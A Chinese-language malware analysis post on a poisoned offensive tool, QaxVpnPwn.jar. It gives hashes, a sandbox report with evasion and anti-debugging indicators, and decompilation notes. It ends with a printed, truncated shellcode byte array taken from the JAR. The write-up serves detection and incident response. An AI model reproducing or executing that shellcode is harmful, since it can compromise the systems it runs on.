title: qax-vpn-pwn工具投毒事件分析
menu: 
  main: 
    parent: "样本分析记录"
tags: [恶意样本分析, 实例]title: qax-vpn-pwn工具投毒事件分析
menu: 
  main: 
    parent: "样本分析记录"
tags: [恶意样本分析, 实例]
date: 2026-05-31T01:12:25+08:00
---

# xaq-vpn-pwn工具投毒事件

## 基本信息
QaxVpnPwn.jar
哈希: 
    MD4: 55d3d7e6ed3d34ca19f292fb6725aaab
    MD5: b330ac8ff7b48d9e61700fae1ead4a1f
    SHA1: cf5c4ea0320689854499a77c9378ed79ba82a542
    SHA224: ee1d7bf17d1f8a56d55cb4fcfdbd608438d3afc0336ef9d513c4d1f1
    SHA256: 5c931a2c1e2d5bccfa4ba4f0c7ad59dd761850ded18364aa94385dbf1db3ab64
    SHA384: 9a1a0c83ed37a079e368b193681361b2d3b52e7ff0ca3901946a81dc849e75d0e23d3d28df44ead5ca5828387a1b7fb4
    SHA512: dc5430044e6ad587601e465a5caa82951a1167d63d493d26d7f0dd8942326ec390be7aed6af0bf5c95a7f247845c81acbaf85081220e2db1b105c8723fadbe65
![](https://raw.githubusercontent.com/x7peeps/x7peeps-images/main/content/安全/应急响应/0x03取证分析/恶意样本分析/样本分析记录/qax-vpn-pwn工具投毒事件分析/16924240359331.jpg)


## 静态分析
在威胁情报查询
```
[+]threatbook情报:
概要信息：
威胁等级：恶意
是否为白名单文件：非白名单
文件提交时间：2023-08-15 10:59:45
文件名称：QaxVpnPwn.jar
文件类型：JAR
文件的 Hash 值：5c931a2c1e2d5bccfa4ba4f0c7ad59dd761850ded18364aa94385dbf1db3ab64
静态标签：jar
检测标签：无数据
威胁分数：0
本次指定获取的沙箱运行分析环境：win10_1903_enx64_office2016
样本分析成功的所有沙箱运行环境列表：win7_sp1_enx86_office2013,win7_sp1_enx64_office2013,win10_1903_enx64_office2016
反病毒扫描引擎检出率：0/24
反病毒扫描引擎检测结果：
扫描时间：2023-08-15 13:48:15
检测结果：
'IKARUS': 'safe'
'vbwebshell': 'safe'
'Avast': 'safe'
'Avira': 'safe'
'Sophos': 'safe'
'K7': 'safe'
'Rising': 'safe'
'Kaspersky': 'safe'
'Panda': 'safe'
'Baidu-China': 'safe'
'NANO': 'safe'
'Antiy': 'safe'
'AVG': 'safe'
'Baidu': 'safe'
'DrWeb': 'safe'
'GDATA': 'safe'
'Microsoft': 'safe'
'Qihu360': 'safe'
'ESET': 'safe'
'ClamAV': 'safe'
'JiangMin': 'safe'
'Trustlook': 'safe'
'MicroAPT': 'safe'
'OneAV': 'safe'
静态信息：
文件类型：Java archive data (JAR)
文件名称：5c931a2c1e2d5bccfa4ba4f0c7ad59dd761850ded18364aa94385dbf1db3ab64-1692078451
行为签名：
签名名称：console_output
签名描述：命令行控制台有数据输出
签名分类：General
严重等级：1
行为签名：
签名名称：create_file_intemp
签名描述：在临时目录中创建文件
签名分类：General
严重等级：1
行为签名：
签名名称：getsysteminfo
签名描述：获取系统信息
签名分类：Environment Awareness
严重等级：1
行为签名：
签名名称：ipurl_in_string
签名描述：在文件内存中发现IP地址或url
签名分类：Static File Characteristics
严重等级：1
行为签名：
签名名称：open_cfg_file
签名描述：尝试打开应用程序的配置文件（.cfg）
签名分类：General
严重等级：1
行为签名：
签名名称：query_machine_timezone
签名描述：包含查询计算机时区的功能
签名分类：Environment Awareness
严重等级：1
行为签名：
签名名称：create_guard_page
签名描述：创建PAGE_GUARD属性的内存页，通常用于反逆向和反调试
签名分类：Anti-Reverse Engineering
严重等级：2
行为签名：
签名名称：evasion_time
签名描述：感知时区，常用于躲避恶意软件分析系统
签名分类：General
严重等级：2
释放行为：无
进程行为：
共分析了1个进程
进程名称：java.exe
进程命令："C:\Program Files\Java\jre1.8.0_121\bin\java.exe" -jar C:\gym95dg\QaxVpnPwn.jar
进程 ID：1692
父进程 ID：1952
网络行为：
dns_servers：8.8.4.4,8.8.8.8
静态信息：
文件类型：Java archive data (JAR)
文件名称：5c931a2c1e2d5bccfa4ba4f0c7ad59dd761850ded18364aa94385dbf1db3ab64-1692078451
分析报告链接：
https://s.threatbook.com/report/file/5c931a2c1e2d5bccfa4ba4f0c7ad59dd761850ded18364aa94385dbf1db3ab64
```


### jar反编译分析
使用jadx-gui查看，可以看到这段可疑代码
![](https://raw.githubusercontent.com/x7peeps/x7peeps-images/main/content/安全/应急响应/0x03取证分析/恶意样本分析/样本分析记录/qax-vpn-pwn工具投毒事件分析/16924203375313.jpg)
看到一段疑似shellcode
```
-4, 72, -125, -28, -16, -24, -56, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, -46, 101, 72, -117, 82, 96, 72, -117, 82, 24, 72, -117, 82, 32, 72, -117, 114, 80, 72, 15, -73, 74, 74, 77, 49, -55, 72, 49, -64, -84, 60, 97, 124, 2, 44, 32, 65, -63, -55, 13, 65, 1, -63, -30, -19, 82, 65, 81, 72, -117, 82, 32, -117, 66, 60, 72, 1, -48, 102, -127, 120, 24, 11, 2, 117, 114, -117, Byte.MIN_VALUE, -120, 0, 0, 0, 72, -123, -64, 116, 103, 72, 1, -48, 80, -117, 72, 24, 68, -117, 64, 32, 73, 1, -48, -29, 86, 72, -1, -55, 65, -117, 52, -120, 72, 1, -42, 77, 49, -55, 72, 49, -64, -84, 65, -63, -55, 13, 65, 1, -63, 56, -32, 117, -15, 76, 3, 76, 36, 8, 69, 57, -47, 117, -40, 88, 68, -117, 64, 36, 73, 1, -48, 102, 65, -117, 12, 72, 68, -117, 64, 28, 73, 1, -48, 65, -117, 4, -120, 72, 1, -48, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, -125, -20, 32, 65, 82, -1, -32, 88, 65, 89, 90, 72, -117, 18, -23, 79, -1, -1, -1, 93, 106, 0, 73, -66, 119, 105, 110, 105, 110, 101, 116, 0, 65, 86, 73, -119, -2